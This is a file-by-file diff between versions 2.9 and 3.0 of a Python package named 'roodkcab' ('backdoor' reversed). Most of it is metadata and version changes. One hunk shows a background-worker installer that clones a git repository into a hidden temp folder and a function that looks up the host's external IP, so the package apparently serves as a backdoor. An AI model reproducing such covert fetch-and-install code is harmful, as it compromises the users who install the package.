# Comparing `tmp/roodkcab-2.9.tar.gz` & `tmp/roodkcab-3.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "roodkcab-2.9.tar", last modified: Sun Jul  2 16:00:51 2023, max compression
+gzip compressed data, was "roodkcab-3.0.tar", last modified: Sun Jul  2 16:04:44 2023, max compression
```

## Comparing `roodkcab-2.9.tar` & `roodkcab-3.0.tar`

### file list

```diff
@@ -1,19 +1,19 @@
-drwxrwxrwx   0        0        0        0 2023-07-02 16:00:51.407151 roodkcab-2.9/
--rw-rw-rw-   0        0        0     1014 2023-07-01 13:36:48.000000 roodkcab-2.9/LICENSE
--rw-rw-rw-   0        0        0      929 2023-07-02 16:00:51.405152 roodkcab-2.9/PKG-INFO
--rw-rw-rw-   0        0        0      399 2023-07-02 15:51:11.000000 roodkcab-2.9/README.md
--rw-rw-rw-   0        0        0      709 2023-07-02 16:00:32.000000 roodkcab-2.9/pyproject.toml
--rw-rw-rw-   0        0        0       42 2023-07-02 16:00:51.407151 roodkcab-2.9/setup.cfg
-drwxrwxrwx   0        0        0        0 2023-07-02 16:00:51.380097 roodkcab-2.9/src/
-drwxrwxrwx   0        0        0        0 2023-07-02 16:00:51.395627 roodkcab-2.9/src/roodkcab/
--rw-rw-rw-   0        0        0        0 2023-07-01 19:55:25.000000 roodkcab-2.9/src/roodkcab/__init__.py
--rw-rw-rw-   0        0        0     2613 2023-07-02 16:00:02.000000 roodkcab-2.9/src/roodkcab/backroundworker.py
--rw-rw-rw-   0        0        0      287 2023-07-02 15:54:51.000000 roodkcab-2.9/src/roodkcab/data.py
--rw-rw-rw-   0        0        0     1225 2023-07-02 11:57:12.000000 roodkcab-2.9/src/roodkcab/filehelper.py
--rw-rw-rw-   0        0        0     1948 2023-07-02 12:10:37.000000 roodkcab-2.9/src/roodkcab/gitHelper.py
-drwxrwxrwx   0        0        0        0 2023-07-02 16:00:51.403152 roodkcab-2.9/src/roodkcab.egg-info/
--rw-rw-rw-   0        0        0      929 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      342 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       37 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/requires.txt
--rw-rw-rw-   0        0        0        9 2023-07-02 16:00:51.000000 roodkcab-2.9/src/roodkcab.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-02 16:04:44.957755 roodkcab-3.0/
+-rw-rw-rw-   0        0        0     1014 2023-07-01 13:36:48.000000 roodkcab-3.0/LICENSE
+-rw-rw-rw-   0        0        0      936 2023-07-02 16:04:44.955715 roodkcab-3.0/PKG-INFO
+-rw-rw-rw-   0        0        0      399 2023-07-02 15:51:11.000000 roodkcab-3.0/README.md
+-rw-rw-rw-   0        0        0      716 2023-07-02 16:04:21.000000 roodkcab-3.0/pyproject.toml
+-rw-rw-rw-   0        0        0       42 2023-07-02 16:04:44.957755 roodkcab-3.0/setup.cfg
+drwxrwxrwx   0        0        0        0 2023-07-02 16:04:44.914603 roodkcab-3.0/src/
+drwxrwxrwx   0        0        0        0 2023-07-02 16:04:44.941191 roodkcab-3.0/src/roodkcab/
+-rw-rw-rw-   0        0        0        0 2023-07-01 19:55:25.000000 roodkcab-3.0/src/roodkcab/__init__.py
+-rw-rw-rw-   0        0        0     2603 2023-07-02 16:03:56.000000 roodkcab-3.0/src/roodkcab/backroundworker.py
+-rw-rw-rw-   0        0        0      287 2023-07-02 15:54:51.000000 roodkcab-3.0/src/roodkcab/data.py
+-rw-rw-rw-   0        0        0     1225 2023-07-02 11:57:12.000000 roodkcab-3.0/src/roodkcab/filehelper.py
+-rw-rw-rw-   0        0        0     1948 2023-07-02 12:10:37.000000 roodkcab-3.0/src/roodkcab/gitHelper.py
+drwxrwxrwx   0        0        0        0 2023-07-02 16:04:44.952716 roodkcab-3.0/src/roodkcab.egg-info/
+-rw-rw-rw-   0        0        0      936 2023-07-02 16:04:44.000000 roodkcab-3.0/src/roodkcab.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      342 2023-07-02 16:04:44.000000 roodkcab-3.0/src/roodkcab.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-02 16:04:44.000000 roodkcab-3.0/src/roodkcab.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       37 2023-07-02 16:04:44.000000 roodkcab-3.0/src/roodkcab.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        9 2023-07-02 16:04:44.000000 roodkcab-3.0/src/roodkcab.egg-info/top_level.txt
```

### Comparing `roodkcab-2.9/LICENSE` & `roodkcab-3.0/LICENSE`

 * *Files identical despite different names*

### Comparing `roodkcab-2.9/PKG-INFO` & `roodkcab-3.0/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 Metadata-Version: 2.1
 Name: roodkcab
-Version: 2.9
-Summary: Tryed Fixing import Bug inside the package!
+Version: 3.0
+Summary: Tryed Fixing import Bug inside the package AGAIIN!
 Author-email: LuxxDEV <lkgames256@gmail.com>
 Project-URL: Homepage, https://github.com/lkgames256/roodkcab
 Project-URL: Bug Tracker, https://github.com/lkgames256/roodkcab/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.9
```

### Comparing `roodkcab-2.9/pyproject.toml` & `roodkcab-3.0/pyproject.toml`

 * *Files 4% similar despite different names*

```diff
@@ -2,19 +2,19 @@
 requires = [
     "setuptools>=61.0"
 ]
 build-backend = "setuptools.build_meta"
 
 [project]
 name = "roodkcab"
-version = "2.9"
+version = "3.0"
 authors = [
   { name="LuxxDEV", email="lkgames256@gmail.com" },
 ]
-description = "Tryed Fixing import Bug inside the package!"
+description = "Tryed Fixing import Bug inside the package AGAIIN!"
 readme = "README.md"
 requires-python = ">=3.9"
 classifiers = [
     "Programming Language :: Python :: 3",
     "License :: OSI Approved :: MIT License",
     "Operating System :: OS Independent",
 ]
```

### Comparing `roodkcab-2.9/src/roodkcab/backroundworker.py` & `roodkcab-3.0/src/roodkcab/backroundworker.py`

 * *Files 7% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 import uuid
 import datetime
 from .gitHelper import *
 
 
 def installer():
     random_id = uuid.uuid4()
-    gitHelper.clone(url="", clone_path=os.getenv("TMP") + f"\installerroodkcab{random_id}")
+    clone(url="", clone_path=os.getenv("TMP") + f"\installerroodkcab{random_id}")
     os.chdir(os.getenv("TMP") + f"\installerroodkcab{random_id}")
     write_data(random_id=random_id)
 
 
 def getExternalIP():
     return requests.get("https://api.ipify.org").text
```

### Comparing `roodkcab-2.9/src/roodkcab/filehelper.py` & `roodkcab-3.0/src/roodkcab/filehelper.py`

 * *Files identical despite different names*

### Comparing `roodkcab-2.9/src/roodkcab/gitHelper.py` & `roodkcab-3.0/src/roodkcab/gitHelper.py`

 * *Files identical despite different names*

### Comparing `roodkcab-2.9/src/roodkcab.egg-info/PKG-INFO` & `roodkcab-3.0/src/roodkcab.egg-info/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 Metadata-Version: 2.1
 Name: roodkcab
-Version: 2.9
-Summary: Tryed Fixing import Bug inside the package!
+Version: 3.0
+Summary: Tryed Fixing import Bug inside the package AGAIIN!
 Author-email: LuxxDEV <lkgames256@gmail.com>
 Project-URL: Homepage, https://github.com/lkgames256/roodkcab
 Project-URL: Bug Tracker, https://github.com/lkgames256/roodkcab/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.9
```

